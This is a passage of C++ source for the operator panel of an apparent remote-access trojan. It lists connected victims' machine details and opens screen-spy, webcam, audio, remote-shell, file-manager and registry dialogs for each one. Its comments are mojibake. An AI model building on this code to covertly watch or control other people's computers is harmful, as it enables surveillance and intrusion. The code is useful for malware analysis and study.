	case TOKEN_SERVERLIST:
		{

			g_2015RemoteDlg->PostMessage(WM_OPENSERVICESDIALOG, 0, (LPARAM)ContextObject);
			break;
		}

	case TOKEN_WEBCAM_BITMAPINFO: // ����ͷ
		{
			g_2015RemoteDlg->PostMessage(WM_OPENWEBCAMDIALOG, 0, (LPARAM)ContextObject);
			break;
		}
	}
}



LRESULT CMy2015RemoteDlg::OnUserToOnlineList(WPARAM wParam, LPARAM lParam)
{
	CString strIP,  strAddr,  strPCName, strOS, strCPU, strVideo, strPing;
	CONTEXT_OBJECT* ContextObject = (CONTEXT_OBJECT*)lParam;         //ע�������  ClientContext  ���Ƿ�������ʱ���б���ȡ��������

	if (ContextObject == NULL)
	{
		return -1;
	}

	CString	strToolTipsText;
	try
	{

		// ���Ϸ������ݰ�
		if (ContextObject->InDeCompressedBuffer.GetBufferLength() != sizeof(LOGIN_INFOR))
		{
			return -1;
		}

		LOGIN_INFOR*	LoginInfor = (LOGIN_INFOR*)ContextObject->InDeCompressedBuffer.GetBuffer();



		sockaddr_in  ClientAddr;
		memset(&ClientAddr, 0, sizeof(ClientAddr));
		int iClientAddrLen = sizeof(sockaddr_in);
		BOOL bOk = getpeername(ContextObject->sClientSocket,(SOCKADDR*)&ClientAddr, &iClientAddrLen);  //IP C   <---IP

	

		strIP = inet_ntoa(ClientAddr.sin_addr);

	

		//��������
		strPCName = LoginInfor->szPCName;
		
		switch (LoginInfor->OsVerInfoEx.dwPlatformId)
		{

		case VER_PLATFORM_WIN32_NT:
			if (LoginInfor->OsVerInfoEx.dwMajorVersion <= 4 )
				strOS = "WindowsNT";
			if ( LoginInfor->OsVerInfoEx.dwMajorVersion == 5 && LoginInfor->OsVerInfoEx.dwMinorVersion == 0 )
				strOS = "Windows2000";
			if ( LoginInfor->OsVerInfoEx.dwMajorVersion == 5 && LoginInfor->OsVerInfoEx.dwMinorVersion == 1 )
				strOS = "WindowsXP";
			if ( LoginInfor->OsVerInfoEx.dwMajorVersion == 5 && LoginInfor->OsVerInfoEx.dwMinorVersion == 2 )
				strOS = "Windows2003";
			if ( LoginInfor->OsVerInfoEx.dwMajorVersion == 6 && LoginInfor->OsVerInfoEx.dwMinorVersion == 0 )
				strOS = "WindowsVista"; 
			if ( LoginInfor->OsVerInfoEx.dwMajorVersion == 6 && LoginInfor->OsVerInfoEx.dwMinorVersion == 1 )
				strOS = "Windows7";
			if ( LoginInfor->OsVerInfoEx.dwMajorVersion == 6 && LoginInfor->OsVerInfoEx.dwMinorVersion == 2 )
				strOS = "Windows8";
		}

		//CPU
		strCPU.Format("%dMHz", LoginInfor->dwCPUMHz);

		//����
		strPing.Format("%d", LoginInfor->dwSpeed);



		strVideo = LoginInfor->bWebCamIsExist ? "��" : "��";

	

		AddList(strIP,strAddr,strPCName,strOS,strCPU,strVideo,strPing,ContextObject);  
	}catch(...){}




}
LRESULT CMy2015RemoteDlg::OnOpenScreenSpyDialog(WPARAM wParam, LPARAM lParam)
{

	//MessageBox("Զ�̿���");
	
	CONTEXT_OBJECT *ContextObject = (CONTEXT_OBJECT*)lParam;


	CScreenSpyDlg	*Dlg = new CScreenSpyDlg(this,m_iocpServer, ContextObject);   //Send  s
	// ���ø�����Ϊ׿��
	Dlg->Create(IDD_DIALOG_SCREEN_SPY, GetDesktopWindow());
	Dlg->ShowWindow(SW_SHOW);

	
	ContextObject->v1   = SCREENSPY_DLG;
	ContextObject->hDlg = Dlg;




	
	return 0;
}

LRESULT CMy2015RemoteDlg::OnOpenFileManagerDialog(WPARAM wParam, LPARAM lParam)
{


	CONTEXT_OBJECT *ContextObject = (CONTEXT_OBJECT*)lParam;

	//ת��CFileManagerDlg  ���캯��
	CFileManagerDlg	*Dlg = new CFileManagerDlg(this,m_iocpServer, ContextObject);
	// ���ø�����Ϊ׿��
	Dlg->Create(IDD_DIALOG_FILE_MANAGER, GetDesktopWindow());    //������������Dlg
	Dlg->ShowWindow(SW_SHOW);

	ContextObject->v1   = FILEMANAGER_DLG;
	ContextObject->hDlg = Dlg;

	return 0;
}
LRESULT CMy2015RemoteDlg::OnOpenTalkDialog(WPARAM wParam, LPARAM lParam)
{
	CONTEXT_OBJECT *ContextObject = (CONTEXT_OBJECT*)lParam;

	//ת��CFileManagerDlg  ���캯��
	CTalkDlg	*Dlg = new CTalkDlg(this,m_iocpServer, ContextObject);
	// ���ø�����Ϊ׿��
	Dlg->Create(IDD_DIALOG_TALK, GetDesktopWindow());    //������������Dlg
	Dlg->ShowWindow(SW_SHOW);

	ContextObject->v1   = TALK_DLG;
	ContextObject->hDlg = Dlg;

	return 0;
}

LRESULT CMy2015RemoteDlg::OnOpenShellDialog(WPARAM wParam, LPARAM lParam)
{
	CONTEXT_OBJECT *ContextObject = (CONTEXT_OBJECT*)lParam;

	//ת��CFileManagerDlg  ���캯��
	CShellDlg	*Dlg = new CShellDlg(this,m_iocpServer, ContextObject);
	// ���ø�����Ϊ׿��
	Dlg->Create(IDD_DIALOG_SHELL, GetDesktopWindow());    //������������Dlg
	Dlg->ShowWindow(SW_SHOW);

	ContextObject->v1   = SHELL_DLG;
	ContextObject->hDlg = Dlg;

	return 0;
}


LRESULT CMy2015RemoteDlg::OnOpenSystemDialog(WPARAM wParam, LPARAM lParam)
{
	CONTEXT_OBJECT *ContextObject = (CONTEXT_OBJECT*)lParam;

	//ת��CFileManagerDlg  ���캯��
	CSystemDlg	*Dlg = new CSystemDlg(this,m_iocpServer, ContextObject);
	// ���ø�����Ϊ׿��
	Dlg->Create(IDD_DIALOG_SYSTEM, GetDesktopWindow());    //������������Dlg
	Dlg->ShowWindow(SW_SHOW);

	ContextObject->v1   = SYSTEM_DLG;
	ContextObject->hDlg = Dlg;

	return 0;
}



LRESULT CMy2015RemoteDlg::OnOpenAudioDialog(WPARAM wParam, LPARAM lParam)
{
	CONTEXT_OBJECT *ContextObject = (CONTEXT_OBJECT*)lParam;

	//ת��CFileManagerDlg  ���캯��
	CAudioDlg	*Dlg = new CAudioDlg(this,m_iocpServer, ContextObject);
	// ���ø�����Ϊ׿��
	Dlg->Create(IDD_DIALOG_AUDIO, GetDesktopWindow());    //������������Dlg
	Dlg->ShowWindow(SW_SHOW);

	ContextObject->v1   = AUDIO_DLG;
	ContextObject->hDlg = Dlg;

	return 0;
}

LRESULT CMy2015RemoteDlg::OnOpenServicesDialog(WPARAM wParam, LPARAM lParam)
{
	CONTEXT_OBJECT *ContextObject = (CONTEXT_OBJECT*)lParam;

	//ת��CFileManagerDlg  ���캯��
	CServicesDlg	*Dlg = new CServicesDlg(this,m_iocpServer, ContextObject);
	// ���ø�����Ϊ׿��
	Dlg->Create(IDD_DIALOG_SERVICES, GetDesktopWindow());    //������������Dlg
	Dlg->ShowWindow(SW_SHOW);

	ContextObject->v1   = SERVICES_DLG;
	ContextObject->hDlg = Dlg;

	return 0;
}

LRESULT CMy2015RemoteDlg::OnOpenRegisterDialog(WPARAM wParam, LPARAM lParam)
{
	CONTEXT_OBJECT *ContextObject = (CONTEXT_OBJECT*)lParam;

	//ת��CFileManagerDlg  ���캯��
	CRegisterDlg	*Dlg = new CRegisterDlg(this,m_iocpServer, ContextObject);
	// ���ø�����Ϊ׿��
	Dlg->Create(IDD_DIALOG_REGISTER, GetDesktopWindow());    //������������Dlg
	Dlg->ShowWindow(SW_SHOW);

	ContextObject->v1   = REGISTER_DLG;
	ContextObject->hDlg = Dlg;

	return 0;
}

LRESULT CMy2015RemoteDlg::OnOpenVideoDialog(WPARAM wParam, LPARAM lParam)
{
	CONTEXT_OBJECT *ContextObject = (CONTEXT_OBJECT*)lParam;

	//ת��CFileManagerDlg  ���캯��
	CVideoDlg	*Dlg = new CVideoDlg(this,m_iocpServer, ContextObject);
	// ���ø�����Ϊ׿��
	Dlg->Create(IDD_DIALOG_VIDEO, GetDesktopWindow());    //������������Dlg
	Dlg->ShowWindow(SW_SHOW);

	ContextObject->v1   = VIDEO_DLG;
	ContextObject->hDlg = Dlg;

	return 0;
}

